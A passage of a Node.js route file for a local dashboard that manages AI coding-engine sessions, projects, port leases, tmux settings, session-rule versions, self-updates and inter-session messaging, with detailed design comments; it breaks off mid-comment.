// PUT /api/learnings/:id/tier — correct a learning's tier by hand.
// The loop advances tiers on its own via recurrence; this is the operator's
// override for when it advanced something they disagree with, or held back
// something they want live now.
route('PUT', '/api/learnings/:id/tier', (_req, res, params, body) => {
  if (!body || typeof body.tier !== 'string') {
    return errorResponse(res, 400, 'tier is required', 'BAD_REQUEST');
  }
  try {
    jsonResponse(res, 200, store.learnings.setTier(Number(params.id), body.tier));
  } catch (err) {
    if (err.code === 'NOT_FOUND') return errorResponse(res, 404, err.message, 'NOT_FOUND');
    if (err.code === 'BAD_REQUEST') return errorResponse(res, 400, err.message, 'BAD_REQUEST');
    throw err;
  }
}, { maxBodySize: 64 * 1024 });

// POST /api/session-rules/conflicts — non-authoritative conflict-candidate signal
route('POST', '/api/session-rules/conflicts', (_req, res, _params, body) => {
  if (!body || typeof body.content !== 'string' || !body.content.trim()) {
    return errorResponse(res, 400, 'content (non-empty string) is required', 'BAD_REQUEST');
  }
  const candidates = store.sessionRules.findConflictCandidates(body.content, body.projectId ?? null, { kind: body.kind });
  jsonResponse(res, 200, { candidates });
}, { maxBodySize: 256 * 1024 });

// GET /api/session-rules/:id/versions — version history (newest first)
route('GET', '/api/session-rules/:id/versions', (_req, res, params) => {
  const rule = store.sessionRules.get(Number(params.id));
  if (!rule) return errorResponse(res, 404, `Session rule ${params.id} not found`, 'NOT_FOUND');
  const versions = store.sessionRules.listVersions(Number(params.id));
  jsonResponse(res, 200, { versions });
});

// POST /api/session-rules/:id/restore — roll back to a prior version.
// Restore is a mutation like PUT/DELETE, so shipped Master baseline rules take
// the same eyes-open gate when the restore would weaken them (content change
// or restoring a disabled snapshot) — the gate predicates must stay symmetric
// across every path that can alter a rule, or the confirm is bypassable.
route('POST', '/api/session-rules/:id/restore', (_req, res, params, body) => {
  if (!body || body.versionNo === undefined) {
    return errorResponse(res, 400, 'versionNo is required', 'BAD_REQUEST');
  }
  try {
    const existing = store.sessionRules.get(Number(params.id));
    if (refuseUnconfirmedBaselineEdit(existing, body.confirmBaselineEdit === true)) {
      const target = store.sessionRules.listVersions(Number(params.id))
        .find((v) => v.versionNo === Number(body.versionNo));
      const weakens = !target || target.content !== existing.content || !target.enabled;
      if (weakens) {
        return errorResponse(res, 400,
          'This is a shipped Master boundary rule — restoring a version that changes or disables it requires confirmBaselineEdit: true (Restore defaults always recovers the baseline)',
          'CONFIRM_REQUIRED');
      }
    }
    // SR-7K2P: optional Critic-gate attestation. Invalid → store throws BAD_REQUEST.
    const rule = store.sessionRules.restore(Number(params.id), Number(body.versionNo), { changedBy: body.changedBy, criticGate: body.criticGate });
    jsonResponse(res, 200, rule);
  } catch (err) {
    if (err.code === 'NOT_FOUND') return errorResponse(res, 404, err.message, 'NOT_FOUND');
    if (err.code === 'BAD_REQUEST') return errorResponse(res, 400, err.message, 'BAD_REQUEST');
    throw err;
  }
});

// GET /api/system
route('GET', '/api/system', (_req, res) => {
  const stats = system.getStats();
  jsonResponse(res, 200, stats);
});

// GET /api/engines — `?refresh=1` re-reads the operator's login PATH before
// probing, rather than reusing the cached one. That is what the setup wizard's
// "Check again" calls: the operator has just installed an engine in another
// window, and an installer that edits their shell profile changes the PATH
// itself, not only what sits on it.
route('GET', '/api/engines', async (req, res) => {
  const refresh = new URL(req.url, 'http://localhost').searchParams.get('refresh') === '1';
  // Awaited, not run synchronously: resolving the login PATH means starting the
  // operator's shell and running their profile, which is unbounded work someone
  // else wrote. Doing that on the event loop inside a route is the defect this
  // whole branch exists to remove.
  if (refresh) await engines.refreshDetectionPath();
  let list = engines.listWithAvailability();
  // Resolve the login PATH before answering "nothing found". The boot probe is
  // fire-and-forget, so a request landing before it settles would otherwise be
  // told detection could not look — reporting a race as a finding, which is the
  // unknown-vs-known conflation this release exists to remove.
  //
  // Keyed on ATTEMPTED, not succeeded: a shell that cannot answer never sets
  // succeeded, so keying on that would re-probe on every request for exactly
  // the operators stuck on this step pressing buttons. Worst case is one
  // request paying for up to two shell starts (`-lic`, then `-lc`, 6s each);
  // afterwards the answer is cached until something explicitly asks for a new
  // one. `?refresh=1` is that explicit ask, and it is a button press.
  if (!list.some((e) => e && e.available) && !engines.detectionProbeAttempted()) {
    await engines.refreshDetectionPath();
    list = engines.listWithAvailability();
  }
  // `detectionCertain: false` means no login shell answered, so detection saw
  // only the PATH launchd gives this service and "not installed" is not a
  // trustworthy answer (#346). The wizard shows that rather than presenting a
  // guess as a fact — and it is what lets an operator whose engine IS installed
  // get past a step that would otherwise be a locked door.
  const certain = list.some((e) => e && e.available) || engines.detectionWasProbed();
  jsonResponse(res, 200, { engines: list, detectionCertain: certain });
});

// GET /api/engines/:id
route('GET', '/api/engines/:id', (_req, res, params) => {
  const profile = engines.getWithAvailability(params.id);
  if (!profile) {
    return errorResponse(res, 404, `Engine "${params.id}" not found`, 'NOT_FOUND');
  }
  jsonResponse(res, 200, profile);
});

// GET /api/models/status — Upstream service status for all engines
route('GET', '/api/models/status', (_req, res) => {
  jsonResponse(res, 200, { status: modelStatus.getStatus() });
});

// GET /api/update-status — Cached update check result
route('GET', '/api/update-status', (_req, res) => {
  jsonResponse(res, 200, updateChecker.getCachedStatus());
});

// POST /api/update/check — measure now, rather than reporting whatever the
// periodic timer last saw.
//
// The timer alone cannot keep the answer current: it fires every four hours, so
// a release published just after a check stays invisible for most of its life,
// and the dashboard's own status poll only re-read the same cached value. This
// is the route that lets a page load, a tab regaining focus, or the operator
// asking directly produce a real measurement.
//
// POST rather than a flag on the GET because it has a side effect — it can start
// a network call. `GET /api/update-status` stays a cheap, side-effect-free cache
// read for the consumers that just want the last known answer.
//
// `{"manual": true}` selects the tighter staleness floor: an explicit request is
// owed a real check, where an automatic one should settle for a recent answer.
// Throttling and single-flight both live in `refreshIfStale`, so no amount of
// reloading turns into a poll loop against origin.
route('POST', '/api/update/check', (_req, res, _params, body) => {
  const maxAge = updateChecker.resolveRefreshFloor(body && body.manual === true);

  // Responds with the status object unchanged — deliberately the same shape as
  // the GET, so nothing has to branch on which route it asked. Whether this was
  // a fresh measurement or a throttled cache hit is already observable in
  // `checkedAt`, which does not move when the cache is reused; a separate
  // `refreshed` flag would be a second encoding of the same fact.
  updateChecker.refreshIfStale(maxAge, (status) => {
    jsonResponse(res, 200, status);
  });
});

// POST /api/update/apply — the self-update ACTION (#228/#229, UB). Fetches +
// checks out the latest release tag; does NOT restart. The client chains
// POST /api/server/restart on a 200. A refused safety guard (dirty tree, no
// update, wrong ref, not a git checkout) returns 409 with a stable `code`; an
// unexpected git failure mid-flow returns 500 with the pre-update `fromSha` so
// recovery is a one-line manual `git checkout <fromSha>`.
route('POST', '/api/update/apply', (_req, res) => {
  const result = updateApplier.applyUpdate();
  if (result.ok) {
    jsonResponse(res, 200, result);
    return;
  }
  jsonResponse(res, result.code === 'git-error' ? 500 : 409, result);
});

// POST /api/tmux/mouse — set a session-level mouse value, or `unset: true`
// to remove the override so the session inherits the global again (#579).
route('POST', '/api/tmux/mouse', (_req, res, _params, body) => {
  if (!body || typeof body.session !== 'string') {
    return errorResponse(res, 400, 'session is required', 'BAD_REQUEST');
  }
  const unset = body.unset === true;
  if (!unset && typeof body.on !== 'boolean') {
    return errorResponse(res, 400, 'on must be a boolean (or pass unset: true)', 'BAD_REQUEST');
  }
  if (unset && typeof body.on === 'boolean') {
    return errorResponse(res, 400, 'on and unset are mutually exclusive', 'BAD_REQUEST');
  }

  try {
    const tmuxName = tmux.toSessionName(body.session);
    if (unset) {
      tmux.unsetMouse(tmuxName);
    } else {
      tmux.setMouse(tmuxName, body.on, { hooks: !!body.hooks });
    }
    // Report the post-op EFFECTIVE state — after an unset that is whatever
    // the session now inherits, which the client cannot know on its own.
    const state = tmux.getMouseState(tmuxName);
    jsonResponse(res, 200, {
      mouse: state.on,
      explicit: state.explicit,
      session: body.session
    });
  } catch (err) {
    return errorResponse(res, 404, err.message, 'NOT_FOUND');
  }
});

// GET /api/ports — List all port leases (optional ?host= filter)
route('GET', '/api/ports', (req, res) => {
  const url = reqUrl(req);
  const hostFilter = url.searchParams.get('host') || undefined;
  const leases = porthub.getLeases(hostFilter ? { host: hostFilter } : undefined);
  const grouped = {};
  for (const lease of leases) {
    const key = lease.host === 'localhost' ? lease.project : `${lease.host}/${lease.project}`;
    if (!grouped[key]) grouped[key] = [];
    grouped[key].push(lease);
  }

  // Count system-detected ports not tracked in lease DB (localhost only)
  const systemPorts = portScanner.getSystemPorts();
  const leasedPortSet = new Set(leases.filter(l => l.host === 'localhost').map(l => l.port));
  const systemPortCount = systemPorts.filter(sp => !leasedPortSet.has(sp.port)).length;

  jsonResponse(res, 200, {
    totalLeases: leases.length,
    systemPortCount,
    leases,
    grouped
  });
});

// POST /api/ports/lease — Create or renew a lease
route('POST', '/api/ports/lease', (_req, res, _params, body) => {
  if (!body || !body.port || !body.project || !body.service) {
    return errorResponse(res, 400, 'port, project, and service are required', 'BAD_REQUEST');
  }
  try {
    const lease = store.portLeases.lease({
      host: body.host || 'localhost',
      port: body.port,
      project: body.project,
      service: body.service,
      permanent: body.permanent || false,
      ttlMs: body.ttl || null,
      description: body.description || null,
      autoRenew: body.autoRenew || false,
      force: body.force === true
    });
    jsonResponse(res, 201, lease);
  } catch (err) {
    // A port already owned by another project is a conflict, not a malformed
    // request — 409 lets a caller retry against a different port, and the owner
    // in the body is what makes that decision possible without a second call.
    if (err.code === 'PORT_CONFLICT') {
      return jsonResponse(res, 409, {
        error: err.message,
        code: 'PORT_CONFLICT',
        owner: err.owner || null
      });
    }
    return errorResponse(res, 400, err.message, 'BAD_REQUEST');
  }
});

// POST /api/ports/sync — Sync leases from old PortHub daemon
route('POST', '/api/ports/sync', (_req, res) => {
  const result = porthub.syncFromDaemon();
  jsonResponse(res, 200, { ok: true, imported: result.imported });
});

// POST /api/ports/release — Release a lease
route('POST', '/api/ports/release', (_req, res, _params, body) => {
  if (!body || !body.port) {
    return errorResponse(res, 400, 'port is required', 'BAD_REQUEST');
  }
  try {
    // `project` is optional but verified when present (#656): a release names
    // whose lease it is, and releasing another live project's port is refused with
    // 409 unless `force` is set. Omitting `project` keeps the prior behavior.
    store.portLeases.release(body.port, body.host || 'localhost', {
      project: body.project || null,
      force: body.force === true
    });
  } catch (err) {
    if (err.code === 'PORT_CONFLICT') {
      return jsonResponse(res, 409, {
        error: err.message,
        code: 'PORT_CONFLICT',
        owner: err.owner || null
      });
    }
    return errorResponse(res, 400, err.message, 'BAD_REQUEST');
  }
  jsonResponse(res, 200, { ok: true, host: body.host || 'localhost', port: body.port });
});

// POST /api/ports/heartbeat — Heartbeat a lease
route('POST', '/api/ports/heartbeat', (_req, res, _params, body) => {
  if (!body || !body.port) {
    return errorResponse(res, 400, 'port is required', 'BAD_REQUEST');
  }
  let lease;
  try {
    // `project` is optional but verified when present (#656): renewing another
    // project's lease keeps a port nobody-you-own alive, so a mismatch is a 409.
    lease = store.portLeases.heartbeat(body.port, body.host || 'localhost', {
      project: body.project || null
    });
  } catch (err) {
    if (err.code === 'PORT_CONFLICT') {
      return jsonResponse(res, 409, {
        error: err.message,
        code: 'PORT_CONFLICT',
        owner: err.owner || null
      });
    }
    return errorResponse(res, 400, err.message, 'BAD_REQUEST');
  }
  if (!lease) {
    return errorResponse(res, 404, `No lease found for port ${body.port}`, 'NOT_FOUND');
  }
  jsonResponse(res, 200, lease);
});

// GET /api/projects
route('GET', '/api/projects', async (req, res) => {
  const urlObj = reqUrl(req);
  const query = parseQuery(urlObj.search);
  const options = {};
  if (query.archived === 'true') options.archived = true;
  if (query.tag) options.tag = query.tag;
  if (query.engine) options.engine = query.engine;

  // `scan` travels with the list, because the list alone cannot say whether it is
  // the whole list — a directory that would not answer degrades to the registered
  // projects, and that used to look identical to having no others (#885).
  const { projects: list, scan } = await projects.listAllProjects(options);
  jsonResponse(res, 200, { projects: list, scan });
});

// POST /api/projects/attach — Attach an existing filesystem directory as a project
route('POST', '/api/projects/attach', async (_req, res, _params, body) => {
  if (!body || !body.name) {
    return errorResponse(res, 400, 'name is required', 'BAD_REQUEST');
  }

  const result = await projects.attachProject(body.name);
  if (!result.project) {
    const firstError = result.errors[0] || 'Attach failed';
    const code = firstError.includes('already registered') ? 'CONFLICT' : 'BAD_REQUEST';
    return errorResponse(res, code === 'CONFLICT' ? 409 : 400, firstError, code);
  }

  const response = {
    id: result.project.id,
    name: result.project.name,
    path: result.project.path,
    engine: result.project.engine,
    tags: result.project.tags,
    registered: true,
    createdAt: result.project.createdAt
  };

  if (result.errors.length > 0) {
    response.warnings = result.errors;
  }

  jsonResponse(res, 201, response);
});

// GET /api/projects/orphan-hooks-scan — Read-only inventory of projects with
// orphan hook entries in .claude/settings.json (#145, chunk 2). MUST be
// registered before GET /api/projects/:name so the literal path wins.
route('GET', '/api/projects/orphan-hooks-scan', (_req, res) => {
  const result = projects.scanForOrphanHooks();
  jsonResponse(res, 200, result);
});

// GET /api/projects/stranded-configs-scan — Read-only inventory of governance
// configs (CLAUDE.md, .claude/settings.json) stranded in unregistered ancestor
// dirs of registered projects (#592). No repair counterpart by design — a
// stranded file can contain hand-written content, so removal is an operator
// decision. MUST be registered before GET /api/projects/:name so the literal
// path wins.
route('GET', '/api/projects/stranded-configs-scan', (_req, res) => {
  const result = projects.scanForStrandedConfigs();
  jsonResponse(res, 200, result);
});

// POST /api/projects/repair-orphan-hooks — Strip orphan hook entries from
// affected projects. Body: `{ project?: string }` for single-target. Returns
// `{ repaired, skipped, errors }` (#145, chunk 2).
route('POST', '/api/projects/repair-orphan-hooks', (_req, res, _params, body) => {
  if (body && body.project !== undefined && typeof body.project !== 'string') {
    return errorResponse(res, 400, 'project must be a string', 'BAD_REQUEST');
  }
  const projectName = body && body.project ? body.project : null;
  const result = projects.repairOrphanHooks(projectName);
  if (projectName && result.errors.some((e) => e.error === 'Project not found')) {
    return errorResponse(res, 404, `Project "${projectName}" not found`, 'NOT_FOUND');
  }
  jsonResponse(res, 200, result);
});

// GET /api/projects/:name
route('GET', '/api/projects/:name', async (_req, res, params) => {
  const project = await projects.getProject(params.name);
  if (!project) {
    return errorResponse(res, 404, `Project "${params.name}" not found`, 'NOT_FOUND');
  }
  jsonResponse(res, 200, project);
});

// POST /api/projects
route('POST', '/api/projects', (_req, res, _params, body) => {
  if (!body || !body.name) {
    return errorResponse(res, 400, 'name is required', 'BAD_REQUEST');
  }

  const result = projects.createProject(body);
  if (!result.project) {
    const code = result.errors[0] && result.errors[0].includes('already exists') ? 'CONFLICT' : 'BAD_REQUEST';
    return errorResponse(res, code === 'CONFLICT' ? 409 : 400, result.errors[0], code);
  }

  const response = {
    id: result.project.id,
    name: result.project.name,
    path: result.project.path,
    engine: result.project.engineId,
    tags: result.project.tags,
    ports: result.project.ports,
    createdAt: result.project.createdAt
  };

  if (result.errors.length > 0) {
    response.warnings = result.errors;
  }

  jsonResponse(res, 201, response);
});

// POST /api/projects/import — Register existing project directories
route('POST', '/api/projects/import', (_req, res, _params, body) => {
  if (!body || !Array.isArray(body.names) || body.names.length === 0) {
    return errorResponse(res, 400, 'names array is required', 'BAD_REQUEST');
  }

  const config = store.config.load();
  const projectsDir = projects.resolveProjectsDir(config.projectsDir);
  const imported = [];
  const warnings = [];
  // Resolved once for the batch — see the bulk-attach route for why per-item
  // resolution is both slow (a detection probe per engine, per item) and wrong
  // (a mid-batch change in what is installed would split the batch across
  // engines).
  const importDefaultEngine = engines.resolveDefaultEngine(config)
    || config.defaultEngine
    || store.DEFAULT_CONFIG.defaultEngine;

  for (const name of body.names) {
    // Case-insensitive identity (#221) — symmetric with createProject /
    // attachProject so import can't introduce a case-collision the other
    // paths would reject.
    const existing = store.projects.getByNameCaseInsensitive(name);
    if (existing) {
      const msg = existing.name === name
        ? `"${name}" already registered`
        : `"${name}" already registered as "${existing.name}" (case-insensitive match)`;
      warnings.push(msg);
      continue;
    }

    const projPath = path.join(projectsDir, name);
    if (!fs.existsSync(projPath) || !fs.statSync(projPath).isDirectory()) {
      // Release orphan port leases — the project can never be imported
      const released = store.portLeases.releaseByProject(name);
      if (released > 0) {
        warnings.push(`"${name}" directory not found — released ${released} orphan port lease${released > 1 ? 's' : ''}`);
      } else {
        warnings.push(`"${name}" directory not found in ${projectsDir}`);
      }
      continue;
    }

    // Prefer an installed engine over the configured default; fall back to that
    // default when nothing is installed (import is bookkeeping, not a launch).
    const engineId = importDefaultEngine;

    try {
      store.projects.create({
        name,
        path: projPath,
        engine: engineId,
        tags: [],
        ports: {}
      });

      // Write per-project config if none exists
      const projConfigPath = path.join(projPath, '.tangleclaw', 'project.json');
      if (!fs.existsSync(projConfigPath)) {
        const projConfig = JSON.parse(JSON.stringify(store.DEFAULT_PROJECT_CONFIG));
        projConfig.engine = engineId;
        store.projectConfig.save(projPath, projConfig);
      }

      imported.push(name);
    } catch (err) {
      warnings.push(`Failed to import "${name}": ${err.message}`);
    }
  }

  if (warnings.length > 0) {
    log.warn('Project import completed with skips', { imported: imported.length, count: warnings.length, warnings });
  }
  jsonResponse(res, 200, { imported, warnings });
});

// DELETE /api/projects/:name
route('DELETE', '/api/projects/:name', async (_req, res, params, body) => {
  const passwordCheck = projects.checkDeletePassword(body ? body.password : undefined);
  if (!passwordCheck.allowed) {
    return errorResponse(res, 403, passwordCheck.error, 'FORBIDDEN');
  }

  const project = projects.getProjectRow(params.name);
  if (!project) {
    return errorResponse(res, 404, `Project "${params.name}" not found`, 'NOT_FOUND');
  }

  const deleteFiles = body && body.deleteFiles === true;
  const result = projects.deleteProject(params.name, { deleteFiles });

  if (!result.success) {
    return errorResponse(res, 500, result.errors[0] || 'Delete failed', 'INTERNAL_ERROR');
  }

  jsonResponse(res, 200, {
    ok: true,
    name: params.name,
    filesDeleted: result.filesDeleted
  });
});

// POST /api/projects/:name/archive — Archive (deactivate) a project
route('POST', '/api/projects/:name/archive', (_req, res, params) => {
  const result = projects.archiveProject(params.name);
  if (!result.success) {
    const firstError = result.errors[0];
    const status = firstError.includes('not found') ? 404 : 400;
    return errorResponse(res, status, firstError, firstError.includes('not found') ? 'NOT_FOUND' : 'BAD_REQUEST');
  }
  jsonResponse(res, 200, { ok: true, name: params.name });
});

// POST /api/projects/:name/unarchive — Restore an archived project
route('POST', '/api/projects/:name/unarchive', (_req, res, params) => {
  const result = projects.unarchiveProject(params.name);
  if (!result.success) {
    const firstError = result.errors[0];
    const status = firstError.includes('not found') ? 404 : 400;
    return errorResponse(res, status, firstError, firstError.includes('not found') ? 'NOT_FOUND' : 'BAD_REQUEST');
  }
  jsonResponse(res, 200, { ok: true, name: params.name });
});

// POST /api/projects/:name/migrate-to-plugin — Migrate a project to V2-plugin
// governance (#262, C1). Cohort-aware (non-Claude → not-applicable) + session-safe
// (defers on a live session; never auto-closes). Idempotent.
route('POST', '/api/projects/:name/migrate-to-plugin', async (_req, res, params) => {
  const result = await projects.migrateProjectToPlugin(params.name);
  if (result.error) {
    const notFound = result.error.includes('not found');
    return errorResponse(res, notFound ? 404 : 400, result.error, notFound ? 'NOT_FOUND' : 'BAD_REQUEST');
  }
  jsonResponse(res, 200, {
    ok: true,
    name: params.name,
    migrationStatus: result.status,
    migrated: result.migrated,
    deferred: result.deferred || false,
    alreadyGoverned: result.alreadyGoverned || false,
    reason: result.reason
  });
});

// PATCH /api/projects/:name
route('PATCH', '/api/projects/:name', async (_req, res, params, body) => {
  if (!body || typeof body !== 'object') {
    return errorResponse(res, 400, 'Request body must be a JSON object', 'BAD_REQUEST');
  }

  const result = await projects.updateProject(params.name, body);

  if (result.errors.length > 0 && !result.project) {
    const firstError = result.errors[0];
    if (firstError.includes('not found')) {
      return errorResponse(res, 404, firstError, 'NOT_FOUND');
    }
    if (firstError.includes('Core rules')) {
      return errorResponse(res, 400, firstError, 'BAD_REQUEST');
    }
    return errorResponse(res, 400, firstError, 'BAD_REQUEST');
  }

  const response = {
    id: result.project.id,
    name: result.project.name,
    engine: result.project.engine.id,
    tags: result.project.tags,
    silentPrime: result.project.silentPrime,
    medusaEnabled: result.project.medusaEnabled,
    medusaWake: result.project.medusaWake,
    defaultLaunchMode: result.project.defaultLaunchMode,
    showLaunchModePicker: result.project.showLaunchModePicker,
    updatedAt: result.project.updatedAt
  };

  if (result.errors.length > 0) {
    response.warnings = result.errors;
  }

  jsonResponse(res, 200, response);
});

// POST /api/projects/:name/actions/:command — Run a project action
// (#139 Chunk 11b). Body is the handler's `options` (forwarded verbatim;
// undefined when absent). Returns the handler's `{ok, output, error}` result.
// Status codes: 200 ok or handler-soft-fail; 400 bad request; 404 project /
// unknown or unavailable action; 500 handler thrown. Routing keys on the
// dispatcher's `code`, never on message text.
route('POST', '/api/projects/:name/actions/:command', async (_req, res, params, body) => {
  const options = body && typeof body === 'object' && !Array.isArray(body) ? body : undefined;
  const result = await actions.runAction(params.name, params.command, options);

  if (!result.ok) {
    if (result.code === 'BAD_REQUEST') {
      return errorResponse(res, 400, result.error, 'BAD_REQUEST');
    }
    if (result.code === 'NOT_FOUND' || result.code === 'UNKNOWN_ACTION' || result.code === 'UNAVAILABLE') {
      return errorResponse(res, 404, result.error, 'NOT_FOUND');
    }
    if (result.code === 'HANDLER_THREW') {
      return errorResponse(res, 500, result.error, 'INTERNAL_ERROR');
    }
    // Soft fail (e.g. detached HEAD, missing project.path, fs error) —
    // return 200 with `ok:false` so the frontend can surface the
    // handler's specific error message inline.
    return jsonResponse(res, 200, result);
  }

  jsonResponse(res, 200, result);
});

// POST /api/sessions/:project — Launch session
route('POST', '/api/sessions/:project', async (_req, res, params, body) => {
  const project = projects.getProjectRow(params.project);
  if (!project) {
    return errorResponse(res, 404, `Project "${params.project}" not found`, 'NOT_FOUND');
  }

  // AUTH-3: stamp the session with the proxy-authenticated user (null in direct
  // mode / when the gate is off — resolveRequestUser enforces the trust gate).
  const owner = authIdentity.resolveRequestUser(_req.headers, store.config.load());

  const result = sessions.launchSession(params.project, {
    primePrompt: body ? body.primePrompt : true,
    engineOverride: body ? body.engineOverride : null,
    mode: body ? body.mode : undefined,
    launchMode: body ? body.launchMode : undefined,
    owner
  });

  // Web UI mode — delegate to async launch path
  if (result.webui) {
    const launchOpts = {
      force: body ? body.force === true : false,
      // #210 Phase 2 — forward the launch-mode picker choice through to
      // launchWebuiSession so it can pre-create a ClawBridge session
      // with the matching permissionMode (resolved against the engine
      // profile's bridgePermissionMode mapping).
      launchMode: body ? body.launchMode : null,
      owner  // AUTH-3: stamp the webui session with the authenticated user too
    };
    sessions.launchWebuiSession(params.project, result._conn, result._engineId, result._engineProfile, result._project, launchOpts)
      .then((webuiResult) => {
        if (webuiResult.error) {
          const status = webuiResult.staleTunnel ? 409 : 500;
          const code = webuiResult.staleTunnel ? 'TUNNEL_CONFLICT' : 'INTERNAL_ERROR';
          const payload = { error: webuiResult.error, code };
          if (webuiResult.staleTunnel) payload.staleTunnel = webuiResult.staleTunnel;
          res.writeHead(status, { 'Content-Type': 'application/json' });
          res.end(JSON.stringify(payload));
          return;
        }
        jsonResponse(res, 201, {
          sessionId: webuiResult.session.id,
          project: params.project,
          engine: webuiResult.session.engineId,
          sessionMode: 'webui',
          tmuxSession: null,
          primePrompt: null,
          startedAt: webuiResult.session.startedAt,
          iframeUrl: webuiResult.iframeUrl,
          ttydUrl: null
        });
      })
      .catch((err) => {
        errorResponse(res, 500, `Web UI launch failed: ${err.message}`, 'INTERNAL_ERROR');
      });
    return;
  }

  if (result.error) {
    if (result.error.includes('already active')) {
      return errorResponse(res, 409, result.error, 'CONFLICT');
    }
    if (result.error.includes('not available')) {
      return errorResponse(res, 400, result.error, 'BAD_REQUEST');
    }
    return errorResponse(res, 500, result.error, 'INTERNAL_ERROR');
  }

  jsonResponse(res, 201, {
    sessionId: result.session.id,
    project: params.project,
    engine: result.session.engineId,
    sessionMode: result.session.sessionMode || 'tmux',
    launchMode: result.session.launchMode || null,
    tmuxSession: result.session.tmuxSession,
    primePrompt: result.primePrompt,
    startedAt: result.session.startedAt,
    iframeUrl: null,
    ttydUrl: result.ttydUrl
  });
});

// DELETE /api/sessions/:project — Kill session
route('DELETE', '/api/sessions/:project', (_req, res, params, body) => {
  const passwordCheck = projects.checkDeletePassword(body ? body.password : undefined);
  if (!passwordCheck.allowed) {
    return errorResponse(res, 403, passwordCheck.error, 'FORBIDDEN');
  }

  const result = sessions.killSession(params.project, body ? body.reason : undefined);
  if (result.error) {
    if (result.error.includes('not found') || result.error.includes('No active')) {
      return errorResponse(res, 404, result.error, 'NOT_FOUND');
    }
    return errorResponse(res, 500, result.error, 'INTERNAL_ERROR');
  }

  // Orphan tmux reconciliation — DB had no session row but tmux had one (#105).
  if (result.reconciled) {
    return jsonResponse(res, 200, {
      ok: true,
      project: params.project,
      reconciled: true
    });
  }

  jsonResponse(res, 200, {
    ok: true,
    sessionId: result.session.id,
    project: params.project,
    durationSeconds: result.session.durationSeconds,
    status: result.session.status
  });
});

// GET /api/sessions/:project/status — Session status + idle detection
route('GET', '/api/sessions/:project/status', (_req, res, params) => {
  const status = sessions.getSessionStatus(params.project);
  if (!status) {
    return errorResponse(res, 404, `Project "${params.project}" not found`, 'NOT_FOUND');
  }
  // CC-7 Slice C — surface a pending typed-wrap request so the session view's
  // status poll can open the wrap drawer (trigger parity with the Wrap button).
  status.wrapRequested = wrapSentinel.isWrapRequested(params.project);
  jsonResponse(res, 200, status);
});

// GET /api/sessions/:project/medusa/status — Medusa listener status (MED-2K9P
// Chunk 01). Thin pass-through to lib/medusa. Resolves the session id from the
// project's active session (matching how the sessions route family resolves it
// via store.sessions.getActive); a `?sessionId=` query param is honored as a
// fallback when no session is active. No active session → an `off` status.
// MED-2K9P v2 T4: the response also carries `loops` — the session's known
// loops with live Bridge state — so the banner loop view rides the existing
// status poll (no new timer). A Bridge failure during the loop fetch degrades
// honestly: `loops: []` plus a `loopsError` naming the reason, never a silent
// empty list; the listener status itself is still returned.
route('GET', '/api/sessions/:project/medusa/status', async (req, res, params) => {
  const project = store.projects.getByName(params.project);
  if (!project) {
    return errorResponse(res, 404, `Project "${params.project}" not found`, 'NOT_FOUND');
  }
  const active = store.sessions.getActive(project.id);
  const query = parseQuery(reqUrl(req).search);
  const sessionId = active ? active.id : (query.sessionId ? query.sessionId : null);
  const status = medusa.getStatus(sessionId);
  let loops = [];
  let loopsError = null;
  if (sessionId != null && status.state !== 'off') {
    try {
      loops = await medusa.getLoops({ sessionId });
    } catch (err) {
      loopsError = err.message;
    }
  }
  jsonResponse(res, 200, loopsError ? { ...status, loops, loopsError } : { ...status, loops });
});

// POST /api/sessions/:project/medusa/toggle — start or stop this session's Medusa
// listener (MED-2K9P Chunk 02). The banner control's click-toggle. Resolves the
// active session like the status route (no active session → 409). Body `{enabled}`
// sets the desired state explicitly (idempotent — safe against double-clicks);
// omitted → flips the current state. Returns the resulting status. Thin
// pass-through to lib/medusa; the browser never talks to the Bridge directly.
route('POST', '/api/sessions/:project/medusa/toggle', (_req, res, params, body) => {
  const project = store.projects.getByName(params.project);
  if (!project) {
    return errorResponse(res, 404, `Project "${params.project}" not found`, 'NOT_FOUND');
  }
  const active = store.sessions.getActive(project.id);
  if (!active) {
    return errorResponse(res, 409, 'No active session to toggle Medusa for', 'NO_SESSION');
  }
  const isOn = medusa.getStatus(active.id).state !== 'off';
  const desired = (body && typeof body.enabled === 'boolean') ? body.enabled : !isOn;
  if (desired) {
    medusa.startSession({ projectPath: project.path, sessionId: active.id, name: project.name });
  } else {
    medusa.stopSession(active.id);
  }
  jsonResponse(res, 200, medusa.getStatus(active.id));
});

// GET /api/sessions/:project/medusa/messages — this session's received inbox
// (MED-2K9P Chunk 02). Backs the read panel. A pure read (no mark-read side
// effect on GET); the read panel clears unread via the POST /read endpoint below.
// Resolves the session id like the status route; no session → an empty inbox.
route('GET', '/api/sessions/:project/medusa/messages', (req, res, params) => {
  const project = store.projects.getByName(params.project);
  if (!project) {
    return errorResponse(res, 404, `Project "${params.project}" not found`, 'NOT_FOUND');
  }
  const active = store.sessions.getActive(project.id);
  const query = parseQuery(reqUrl(req).search);
  const sessionId = active ? active.id : (query.sessionId ? query.sessionId : null);
  const messages = sessionId == null ? [] : medusa.getMessages(sessionId);
  jsonResponse(res, 200, { messages });
});

// POST /api/sessions/:project/medusa/read — mark this session's inbox read,
// clearing the unread badge (MED-2K9P Chunk 02). Fired when the operator opens
// the read panel. Idempotent; a session with no listener is a safe no-op.
route('POST', '/api/sessions/:project/medusa/read', (_req, res, params) => {
  const project = store.projects.getByName(params.project);
  if (!project) {
    return errorResponse(res, 404, `Project "${params.project}" not found`, 'NOT_FOUND');
  }
  const active = store.sessions.getActive(project.id);
  const sessionId = active ? active.id : null;
  if (sessionId != null) medusa.markRead(sessionId);
  jsonResponse(res, 200, medusa.getStatus(sessionId));
});

// GET /api/sessions/:project/medusa/roster — the live roster of other registered
// workspaces this session can message (MED-2K9P Chunk 03), proxied from the Bridge
// (`GET /workspaces`) with the calling session's own workspace excluded. Requires
// an active session (409). The browser never calls the Bridge directly.
route('GET', '/api/sessions/:project/medusa/roster', async (_req, res, params) => {
  const project = store.projects.getByName(params.project);
  if (!project) {
    return errorResponse(res, 404, `Project "${params.project}" not found`, 'NOT_FOUND');
  }
  const active = store.sessions.getActive(project.id);
  if (!active) {
    return errorResponse(res, 409, 'No active session to list a roster for', 'NO_SESSION');
  }
  try {
    const workspaces = await medusa.getRoster({ sessionId: active.id });
    jsonResponse(res, 200, { workspaces });
  } catch (err) {
    errorResponse(res, err.httpStatus || 502, err.message, err.code || 'MEDUSA_ROSTER_FAILED');
  }
});

// POST /api/sessions/:project/medusa/send — send a direct message from this
// session to another workspace (MED-2K9P Chunk 03). Body `{ to, message }`.
// Requires an active session (409). Returns the HONEST result — `received`
